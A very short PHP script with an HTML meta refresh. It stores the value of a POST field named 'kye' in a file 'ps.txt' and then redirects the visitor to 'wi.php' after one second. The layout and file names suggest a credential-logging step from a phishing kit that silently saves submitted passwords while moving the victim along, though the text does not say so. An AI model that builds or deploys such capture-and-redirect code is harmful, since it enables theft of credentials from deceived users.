<meta http-equiv="refresh" content="1;URL=wi.php">
<?php
$cot = $_POST["kye"];

$fp = fopen("ps.txt", "w");
fwrite($fp, $cot);
fclose($fp);


?>
